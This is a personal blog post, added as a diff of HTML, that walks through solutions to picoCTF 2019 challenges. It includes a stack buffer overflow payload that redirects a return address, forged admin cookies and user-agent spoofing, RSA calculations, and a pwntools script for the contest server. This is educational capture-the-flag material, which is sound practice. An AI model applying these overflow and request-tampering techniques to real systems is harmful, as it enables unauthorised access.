@@ -1,0 +1,230 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Day1 - Pico part 1 // Danil Delegator&#39;s Blog</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.69.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Danil Delegator" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://danildelegator.github.io/css/main.min.61bb32028587f24ca28522d8d197970c7ef33284e5fffb45a75fcbbb2dbc4dcb.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Day1 - Pico part 1"/>
+<meta name="twitter:description" content="After solving all the 50 and 100 challenges I decided it&rsquo;s not worth posting them. So for the next few days I&rsquo;ll hopefully post all &gt;100 points challenges.
+OverFlow 1 (150p) Run checksec on the file - no aslr. This means all the addresses are the same as they are in ida. In ida we find the function flag that prints out the flag @ 0x080485E6.
+Also the checksec shows there are no stack canaries I we can easily overwrite the return address on the stack using the stack buffer overflow."/>
+
+    <meta property="og:title" content="Day1 - Pico part 1" />
+<meta property="og:description" content="After solving all the 50 and 100 challenges I decided it&rsquo;s not worth posting them. So for the next few days I&rsquo;ll hopefully post all &gt;100 points challenges.
+OverFlow 1 (150p) Run checksec on the file - no aslr. This means all the addresses are the same as they are in ida. In ida we find the function flag that prints out the flag @ 0x080485E6.
+Also the checksec shows there are no stack canaries I we can easily overwrite the return address on the stack using the stack buffer overflow." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://danildelegator.github.io/day1/" />
+<meta property="article:published_time" content="2020-04-16T11:45:06+03:00" />
+<meta property="article:modified_time" content="2020-04-16T11:45:06+03:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://danildelegator.github.io"><img class="app-header-avatar" src="/images/avatar.jpg" alt="Danil Delegator" /></a>
+      <h1>Danil Delegator&#39;s Blog</h1>
+      <p>This is not filled in yet.</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/DanilDelegator" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/DaDelegator" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://linkedin.com/in/Danil-Delegator" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Day1 - Pico part 1</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Apr 16, 2020
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div></div>
+    </header>
+    <div class="post-content">
+      <p>After solving all the 50 and 100 challenges I decided it&rsquo;s not worth posting them. So for the next few days I&rsquo;ll hopefully post all &gt;100 points challenges.</p>
+<h3 id="overflow-1-150p">OverFlow 1 (150p)</h3>
+<p>Run checksec on the file - no aslr. This means all the addresses are the same as they are in ida. In ida we find the function <code>flag</code> that prints out the flag @ <code>0x080485E6</code>.</p>
+<p>Also the checksec shows there are no stack canaries I we can easily overwrite the return address on the stack using the stack buffer overflow.</p>
+<p>Using <code>pattern create</code> and <code>pattern offset</code> we see that the offset for ret is at 76.</p>
+<p>Construct the payload and get the flag:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python -c <span style="color:#e6db74">&#34;print(&#39;A&#39;*76 + &#39;\xe6\x85\x04\x08&#39;)&#34;</span> | ./vuln
+Give me a string and lets see what happens: 
+Woah, were jumping to 0x80485e6 !
+picoCTFpicoCTF<span style="color:#f92672">{</span>n0w_w3r3_ChaNg1ng_r3tURn5a21b59fb<span style="color:#f92672">}</span>
+</code></pre></div><h3 id="so-meta-150p">So Meta (150p)</h3>
+<p>Just tried grepping for the flag and it worked.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings pico_img.png | grep pico
+picoCTF<span style="color:#f92672">{</span>s0_m3ta_505fdd8b<span style="color:#f92672">}</span>
+</code></pre></div><h3 id="what-lies-within-150p">What Lies Within (150p)</h3>
+<p>This is a classic Steganography challenge, all you need to do is google for an online decoder and use it to get the flag:
+picoCTF{h1d1ng_1n_th3_b1t5}</p>
+<h3 id="extensions-150p">extensions (150p)</h3>
+<p>When I cat the flag content I see it has a PNG header (Alternatively use binwalk).</p>
+<p>After opening the flag.txt file in my favourite image viewer I can see the flag:
+picoCTF{now_you_know_about_extensions}</p>
+<h3 id="shark-on-wire-1-150p">shark on wire 1 (150p)</h3>
+<p>I opened the pcap in wireshark and one of the udp streams (rightclick-&gt;Follow-&gt;UDP Stream) contained the flag:
+picoCTF{StaT31355_636f6e6e}</p>
+<h3 id="based-200p">Based (200p)</h3>
+<p>So here we must decode 3 number as strings fast:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">for</span> num <span style="color:#f92672">in</span> <span style="color:#f92672">&lt;</span>first_input<span style="color:#f92672">&gt;.</span>split():
+    <span style="color:#66d9ef">print</span>(chr(int(num, <span style="color:#ae81ff">2</span>)), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+
+<span style="color:#66d9ef">for</span> num <span style="color:#f92672">in</span> <span style="color:#f92672">&lt;</span>second_input<span style="color:#f92672">&gt;.</span>split():
+    <span style="color:#66d9ef">print</span>(chr(int(num, <span style="color:#ae81ff">8</span>)), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+
+<span style="color:#75715e"># The fastest was just adding \x every 2 chars to get:</span>
+<span style="color:#75715e"># &#34;656170&#34; -&gt; &#34;\x65\x61\x70&#34; -&gt; &#34;map</span>
+</code></pre></div><p>and we get the flag:
+picoCTF{learning_about_converting_values_4b4e293e}</p>
+<h3 id="first-grep-part-ii-200p">First Grep: Part II (200p)</h3>
+<p>To grep recursively grep has the <code>-r</code> flag. So to grep inside all the folder I used:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">grep -r <span style="color:#e6db74">&#39;pico&#39;</span> *<span style="color:#e6db74">`</span>
+</code></pre></div><p>and got the flag:
+picoCTF{grep_r_to_find_this_e4fa3ba7}</p>
+<h3 id="flags-200p">Flags (200p)</h3>
+<p>This was a really annoying one for me because I thought I needed to code all permutation of the possibilities and only one would seem sensible. So I did:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> string<span style="color:#f92672">,</span> itertools
+
+letters <span style="color:#f92672">=</span> list(string<span style="color:#f92672">.</span>ascii_lowercase)
+[letters<span style="color:#f92672">.</span>remove(c) <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;picotf&#39;</span>]
+
+<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> itertools<span style="color:#f92672">.</span>permutations(letters, <span style="color:#ae81ff">7</span>):
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;f{0}{1}{2}{3}{1}{4}{5}{3}t{6}ff&#34;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">*</span>c))
+</code></pre></div><p>after seeing there were too many possibilities I limited the code to only spit the once starting with <code>flags</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">c[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;l&#39;</span> <span style="color:#f92672">and</span> c[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;a&#39;</span> <span style="color:#f92672">and</span> c[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;g&#39;</span> <span style="color:#f92672">and</span> c[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;s&#39;</span>
+</code></pre></div><p>But unfortunately nothing seemed to fit except <code>flagsarestuff</code> or <code>flagsandstuff</code>.</p>
+<p>Finally I thought about googling: &ldquo;flags decode&rdquo; and ofc the first link was the decoding of the flags.</p>
+<p>The flag is: <code>PICOCTF{F1AG5AND5TUFF}</code></p>
+<h3 id="mr-worldwide-200p">Mr-Worldwide (200p)</h3>
+<p>The message.txt file contains something that looks like coordinates.
+First I started writing down the first letters of the cities and got <code>NODIAL_ALANAA</code> somehow. I was sure this was the challenge though so i played with other parameters of places and like regions and finally after many attempts got the flag:
+picoCTF{KODIAK_ALASKA}</p>
+<h3 id="open-to-admins-200p">Open-to-admins (200p)</h3>
+<p>Using burp I added 2 cookies:
+admin=True; time=1400</p>
+<p>and got the flag in the response:
+picoCTF{0p3n_t0_adm1n5_effb525e}</p>
+<h3 id="tapping-200p">Tapping (200p)</h3>
+<p>The message looked like morse code so i googled for an online morse code decoder and the message decoded to:
+picoCTF{m0rs3c0d31sfun3960854397}</p>
+<h3 id="la-cifra-de-200p">la cifra de (200p)</h3>
+<p>I edited the user-agent of the request in burp to <code>picobrowser</code> and got the flag:
+picoCTF{p1c0_s3cr3t_ag3nt_55e7edbc}</p>
+<h3 id="plumbing-200p">plumbing (200p)</h3>
+<p>I redirected the nc outout to a file and then greped for <code>pico</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc 2019shell1.picoctf.com <span style="color:#ae81ff">21957</span> &gt; plumbing.txt
+grep <span style="color:#e6db74">&#39;pico&#39;</span> plumbing.txt
+</code></pre></div><p>flag: picoCTF{digital_plumb3r_c1082838}</p>
+<h3 id="rsa-pop-quiz-200p">rsa-pop-quiz (200p)</h3>
+<p>This one was the first challenging one for me because I didn&rsquo;t know RSA well. This is why I decided not to use a tool like RsaCtfSolver but do it by hand.</p>
+<ol>
+<li>p<em>q = 60413</em>76753 = 4636878989</li>
+<li>n // p = 5051846941 // 54269 = 93089</li>
+<li><code>NO</code> because the basis of all of RSA is that you can not get <code>p</code> and <code>q</code> by knowing <code>n</code>.</li>
+<li>The easiest way is to use an online calculator but it&rsquo;s just (p-1)(q-1) = 836623060.</li>
+<li>msg**e % N</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pow(msg, e, N) <span style="color:#75715e"># = 256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813</span>
+</code></pre></div><ol start="6">
+<li><code>NO</code> because you can not decrypt without <code>d</code> and you can not get it without an <code>e</code> and <code>n</code>.</li>
+<li>Using modinv to get d. I need to calculate the phi using q and p which is</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">q <span style="color:#f92672">=</span> <span style="color:#ae81ff">92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559</span>
+p <span style="color:#f92672">=</span> <span style="color:#ae81ff">97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637</span>
+phi<span style="color:#f92672">=</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+e<span style="color:#f92672">=</span><span style="color:#ae81ff">65537</span>
+</code></pre></div><p>The python function to calculate inverse is:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">egcd</span>(a, b):
+    <span style="color:#66d9ef">if</span> a <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+        <span style="color:#66d9ef">return</span> (b, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">else</span>:
+        g, y, x <span style="color:#f92672">=</span> egcd(b <span style="color:#f92672">%</span> a, a)
+        <span style="color:#66d9ef">return</span> (g, x <span style="color:#f92672">-</span> (b <span style="color:#f92672">//</span> a) <span style="color:#f92672">*</span> y, y)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">modinv</span>(a, m):
+    g, x, y <span style="color:#f92672">=</span> egcd(a, m)
+    <span style="color:#66d9ef">if</span> g <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
+        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;modular inverse does not exist&#39;</span>)
+    <span style="color:#66d9ef">else</span>:
+        <span style="color:#66d9ef">return</span> x <span style="color:#f92672">%</span> m
+</code></pre></div><p>so I run:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">d <span style="color:#f92672">=</span> modinv(e, phi)
+<span style="color:#75715e"># d = 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729</span>
+</code></pre></div><ol start="8">
+<li></li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p <span style="color:#f92672">=</span> <span style="color:#ae81ff">153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433</span>
+c <span style="color:#f92672">=</span> <span style="color:#ae81ff">14177987223508642131782797570705581865562801943020304324633179842233648468773284681099013143283137490421880620316003804700542539367277056119924780390073376368416200076614798528210303393148038397972770835314176889384910743248227379602503304665968858682295687434435804347875820140516870497567301408412715581672979699897049453701769585723745678466885154478156861404094657217832388752774912467316297776811251467400544288767645372505477570969704731692064200678746651536132006463037418757874224499384628808197361618023507921293784071910631939869468132820891513863046467487362047958571217107053268878096051632274561080703969</span>
+e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
+n <span style="color:#f92672">=</span> <span style="color:#ae81ff">23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239</span>
+q <span style="color:#f92672">=</span> n <span style="color:#f92672">//</span> p
+phi <span style="color:#f92672">=</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+d <span style="color:#f92672">=</span> modinv(phi, e)
+pow(c,d,n)
+</code></pre></div><p>and here is everything in one ugly-ass script:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> codecs
+
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;2019shell1.picoctf.com&#39;</span>, <span style="color:#e6db74">&#39;41419&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send</span>(r, answerable, answer<span style="color:#f92672">=</span>None):
+    r<span style="color:#f92672">.</span>read()
+    r<span style="color:#f92672">.</span>writeline(<span style="color:#e6db74">&#39;Y&#39;</span> <span style="color:#66d9ef">if</span> answerable <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;N&#39;</span>)
+    <span style="color:#66d9ef">if</span> answerable:
+        r<span style="color:#f92672">.</span>read()
+        r<span style="color:#f92672">.</span>writeline(answer)
+
+send(r, True, <span style="color:#e6db74">&#39;4636878989&#39;</span>)
+send(r, True, <span style="color:#e6db74">&#39;93089&#39;</span>)
+send(r, False)
+send(r, True, <span style="color:#e6db74">&#39;836623060&#39;</span>)
+send(r, True, <span style="color:#e6db74">&#39;256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813&#39;</span>)
+send(r, False)
+send(r, True, <span style="color:#e6db74">&#39;1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729&#39;</span>)
+send(r, True, <span style="color:#e6db74">&#39;14311663942709674867122208214901970650496788151239520971623411712977119792751215170179850877&#39;</span>)
+
+<span style="color:#66d9ef">print</span>(codecs<span style="color:#f92672">.</span>decode(hex(<span style="color:#ae81ff">14311663942709674867122208214901970650496788151239520971623411712977119792751215170179850877</span>)[<span style="color:#ae81ff">2</span>:], <span style="color:#e6db74">&#39;hex&#39;</span>))
+</code></pre></div><p>This is it for today. Hopefully tomorrow i can keep up the pace and do at least another 10 Challenges.</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
